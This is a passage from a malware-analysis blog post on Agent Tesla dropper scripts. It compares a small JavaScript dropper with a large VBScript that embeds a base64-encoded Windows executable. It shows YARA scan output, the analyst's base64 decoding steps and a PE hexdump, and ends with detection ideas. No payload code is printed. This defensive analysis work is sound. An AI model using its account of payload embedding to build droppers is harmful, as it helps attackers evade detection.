File Type Extension             : txt
MIME Type                       : text/plain
MIME Encoding                   : us-ascii
Newlines                        : Windows CRLF
Line Count                      : 17
Word Count                      : 49
</pre></table></code></div></div><p>This script weighs in at 935KiB vs the first script’s 1917 bytes. This size difference is because the adversary chose to encode the second stage in base64 and embed it within the script. In some instances, I’ve seen adversaries embed multiple binaries into a script resulting in script sizes above 1MB. This helps the adversary avoid making network connections to get subsequent stages, but it gives defenders some extra clues. First, large scripts are more suspicious for any defenders that go hunting. Also, the more content adversaries include within their scripts, the more likely they are to trip YARA rules. We can see an example of this with these scripts.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>remnux@remnux:~/cases/tesla$ yara-rules TGFTR.vbs 
Base64_encoded_Executable TGFTR.vbs

remnux@remnux:~/cases/tesla$ yara-rules ../js-tesla/documentos.js
</pre></table></code></div></div><p>For the VBscript containing the embedded stage, YARA detected an encoded Windows EXE. For the JS dropper that didn’t have embedded content, YARA found nothing (although a custom ruleset would work better). For this demonstration I’m using the default YARA rules included with REMnux.</p><p>An additional issue embedding poses for the adversary: once a malware analyst has the first stage script, they can extract the subsequent versions easily, depending on the level of obfuscation. In this case, I could copy all of the content from <code class="language-plaintext highlighter-rouge">TVqQ</code> through the end of the string and paste it into its own file named <code class="language-plaintext highlighter-rouge">mal.b64</code>. Then I used <code class="language-plaintext highlighter-rouge">base64 -d</code> to decode the file into a Windows EXE.</p><p><img data-src="/assets/images/a-tale-of-two-dropper-scripts/vscode-b64.png" alt="VScode create base64 text file" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>remnux@remnux:~/cases/tesla$ base64 -d mal.b64 &gt; mal.bin 

remnux@remnux:~/cases/tesla$ file mal.bin 
mal.bin: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows

remnux@remnux:~/cases/tesla$ hexdump -C mal.bin | head
00000000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|
00000010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 80 00 00 00  |................|
00000040  0e 1f ba 0e 00 b4 09 cd  21 b8 01 4c cd 21 54 68  |........!..L.!Th|
00000050  69 73 20 70 72 6f 67 72  61 6d 20 63 61 6e 6e 6f  |is program canno|
00000060  74 20 62 65 20 72 75 6e  20 69 6e 20 44 4f 53 20  |t be run in DOS |
00000070  6d 6f 64 65 2e 0d 0d 0a  24 00 00 00 00 00 00 00  |mode....$.......|
00000080  50 45 00 00 4c 01 03 00  fe f0 ce 61 00 00 00 00  |PE..L......a....|
00000090  00 00 00 00 e0 00 02 01  0b 01 30 00 00 e8 0a 00  |..........0.....|
</pre></table></code></div></div><p>Sure enough, we can see the extracted material is a Windows EXE! If you’re looking for detection ideas for this path, you can focus on the script content itself and use YARA, nework signatures, AV rules, and possibly behavioral analytics like <code class="language-plaintext highlighter-rouge">wscript.exe</code> spawning things it just wrote to disk.</p><p>Thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>Malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/agenttesla/" class="post-tag no-text-decoration" >agenttesla</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/javascript/" class="post-tag no-text-decoration" >javascript</a> <a href="/tags/vbs/" class="post-tag no-text-decoration" >vbs</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=A Tale of Two Dropper Scripts for Agent Tesla - Tony Lambert&amp;url=https://forensicitguy.github.io/a-tale-of-two-dropper-scripts/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=A Tale of Two Dropper Scripts for Agent Tesla - Tony Lambert&amp;u=https://forensicitguy.github.io/a-tale-of-two-dropper-scripts/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/a-tale-of-two-dropper-scripts/&amp;text=A Tale of Two Dropper Scripts for Agent Tesla - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/a-tale-of-two-dropper-scripts/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/agenttesla-vba-certutil-download/"><div class="card-body"> <em class="timeago small" data-ts="1648252800" > 2022-03-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>An AgentTesla Sample Using VBA Macros and Certutil</h3><div class="text-muted small"><p> AgentTesla is a .NET stealer that adversaries commonly buy and combine with other malicious products for deployment. In this post I’m tearing into a XLSM document that downloads and executes furthe...</p></div></div></a></div><div class="card"> <a href="/agenttesla-rtf-dotnet-tradecraft/"><div class="card-body"> <em class="timeago small" data-ts="1644105600" > 2022-02-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AgentTesla From RTF Exploitation to .NET Tradecraft</h3><div class="text-muted small"><p> When adversaries buy and deploy threats like AgentTesla you often see this functional and entertaining chain of older exploitation activity with some .NET framework tradecraft you’d expect from som...</p></div></div></a></div><div class="card"> <a href="/decoding-webshell-using-nodejs/"><div class="card-body"> <em class="timeago small" data-ts="1641427200" > 2022-01-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Decoding an Encoded Webshell Using NodeJS</h3><div class="text-muted small"><p> In this post I want to walk through a process of using the NodeJS REPL (Read, Eval, Print Loop) to safely decode portions of malware during analysis. If you want to follow along at home, the sample...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/analyzing-magnitude-magniber-appx/" class="btn btn-outline-primary" prompt="Older"><p>Analyzing a Magnitude EK Appx Package Dropping Magniber</p></a> <a href="/extracting-indicators-from-packed-mirai/" class="btn btn-outline-primary" prompt="Newer"><p>Extracting Indicators from a Packed Mirai Sample</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
